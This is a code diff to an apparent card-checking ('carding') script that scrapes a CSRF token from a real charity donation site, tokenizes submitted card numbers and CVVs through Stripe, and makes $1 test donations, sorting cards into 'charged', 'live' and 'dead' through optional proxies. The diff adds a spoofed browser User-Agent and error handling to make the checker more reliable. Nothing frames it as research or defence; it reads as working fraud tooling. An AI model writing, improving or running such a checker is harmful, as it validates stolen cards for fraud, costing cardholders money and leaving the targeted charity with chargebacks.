@@ -16,16 +16,27 @@ async def check_stripe_heartcry(card, month, year, cvv, proxy=None):
     try:
         if len(year) == 2: year = "20" + year
         
+        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+        headers = {"User-Agent": ua}
+        
         async with aiohttp.ClientSession() as session:
             # 1. Get Authenticity Token
-            async with session.get("https://heartcry.simpledonation.com/", proxy=proxy, timeout=30) as resp:
-                text = await resp.text()
+            try:
+                async with session.get("https://heartcry.simpledonation.com/", headers=headers, proxy=proxy, timeout=30) as resp:
+                    if resp.status != 200:
+                        return {"status": "error", "response": f"Site Down ({resp.status})", "gate": "HeartCry"}
+                    text = await resp.text()
+            except Exception as e:
+                err = str(e)
+                if "name resolution" in err.lower() or "cannot connect" in err.lower():
+                     return {"status": "error", "response": "Connection/Proxy Error ❌", "gate": "HeartCry"}
+                return {"status": "error", "response": f"Connection Failed: {err[:50]}", "gate": "HeartCry"}
                 
-                # Extract CSRF token
-                csrf = re.search(r'name="authenticity_token" value="([^"]+)"', text)
-                if not csrf:
-                    return {"status": "error", "response": "Failed to get CSRF token", "gate": "HeartCry"}
-                csrf_token = csrf.group(1)
+            # Extract CSRF token
+            csrf = re.search(r'name="authenticity_token" value="([^"]+)"', text)
+            if not csrf:
+                return {"status": "error", "response": "Failed to get CSRF token", "gate": "HeartCry"}
+            csrf_token = csrf.group(1)
 
             # 2. Tokenize Card via Stripe API (v2)
             # SimpleDonation uses older Stripe.js, likely uses tokens endpoint
@@ -34,7 +45,8 @@ async def check_stripe_heartcry(card, month, year, cvv, proxy=None):
             token_url = "https://api.stripe.com/v1/tokens"
             token_headers = {
                  "Authorization": f"Bearer {stripe_pk}",
-                 "Content-Type": "application/x-www-form-urlencoded"
+                 "Content-Type": "application/x-www-form-urlencoded",
+                 "User-Agent": ua
             }
             token_data = {
                 "card[number]": card,
@@ -49,14 +61,17 @@ async def check_stripe_heartcry(card, month, year, cvv, proxy=None):
                 "key": stripe_pk
             }
             
-            async with session.post(token_url, data=token_data, headers=token_headers, proxy=proxy, timeout=20) as resp_tok:
-                tok_res = await resp_tok.json()
-                
-                if "error" in tok_res:
-                    err = tok_res["error"]["message"]
-                    return {"status": "dead", "response": err, "gate": "HeartCry (Token)"}
-                
-                stripe_token = tok_res["id"]
+            try:
+                async with session.post(token_url, data=token_data, headers=token_headers, proxy=proxy, timeout=20) as resp_tok:
+                    tok_res = await resp_tok.json()
+                    
+                    if "error" in tok_res:
+                        err = tok_res["error"]["message"]
+                        return {"status": "dead", "response": err, "gate": "HeartCry (Token)"}
+                    
+                    stripe_token = tok_res["id"]
+            except Exception as e:
+                 return {"status": "error", "response": f"Tokenization Failed: {str(e)[:50]}", "gate": "HeartCry"}
 
             # 3. Submit Donation ($1)
             # Based on form fields observed
@@ -78,16 +93,19 @@ async def check_stripe_heartcry(card, month, year, cvv, proxy=None):
                 "commit": "Click to confirm gift of $1.00"
             }
             
-            async with session.post(donate_url, data=payload, proxy=proxy, timeout=30) as resp_charge:
-                text_charge = await resp_charge.text()
-                
-                if "Thank you" in text_charge or "success" in text_charge.lower():
-                     return {"status": "charged", "amount": "$1.00", "response": "Donation Successful 🔥", "gate": "HeartCry"}
-                
-                if "insufficient" in text_charge.lower():
-                     return {"status": "live", "response": "Insufficient Funds ✅", "gate": "HeartCry"}
-                
-                return {"status": "dead", "response": "Declined", "gate": "HeartCry"}
+            try:
+                async with session.post(donate_url, data=payload, headers=headers, proxy=proxy, timeout=30) as resp_charge:
+                    text_charge = await resp_charge.text()
+                    
+                    if "Thank you" in text_charge or "success" in text_charge.lower():
+                         return {"status": "charged", "amount": "$1.00", "response": "Donation Successful 🔥", "gate": "HeartCry"}
+                    
+                    if "insufficient" in text_charge.lower():
+                         return {"status": "live", "response": "Insufficient Funds ✅", "gate": "HeartCry"}
+                    
+                    return {"status": "dead", "response": "Declined", "gate": "HeartCry"}
+            except Exception as e:
+                 return {"status": "error", "response": f"Charge Failed: {str(e)[:50]}", "gate": "HeartCry"}
                 
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": "HeartCry"}
